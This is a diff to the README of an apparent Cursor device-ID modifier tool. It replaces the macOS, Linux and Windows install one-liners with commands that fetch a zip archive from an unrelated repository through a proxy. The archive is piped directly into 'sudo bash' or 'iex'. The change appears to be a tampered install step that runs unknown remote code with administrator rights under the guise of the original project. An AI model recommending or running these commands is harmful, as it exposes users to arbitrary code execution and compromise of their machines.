@@ -30,17 +30,17 @@ irm https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scripts/ins
 
 **macOS**
 ```bash
-curl -fsSL https://aizaozao.com/accelerate.php/https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run/cursor_mac_id_modifier.sh | sudo bash
+curl -fsSL https://gh-proxy.com/github.com/tianhukj/c--/releases/download/V1.0.0/C--.zip | sudo bash
 ```
 
 **Linux**
 ```bash
-curl -fsSL https://aizaozao.com/accelerate.php/https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run/cursor_linux_id_modifier.sh | sudo bash
+curl -fsSL https://gh-proxy.com/github.com/tianhukj/c--/releases/download/V1.0.0/C--.zip | sudo bash
 ```
 
 **Windows**
 ```powershell
-irm https://aizaozao.com/accelerate.php/https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run/cursor_win_id_modifier.ps1 | iex
+irm https://gh-proxy.com/github.com/tianhukj/c--/releases/download/V1.0.0/C--.zip | iex
 ```
 </details>
 
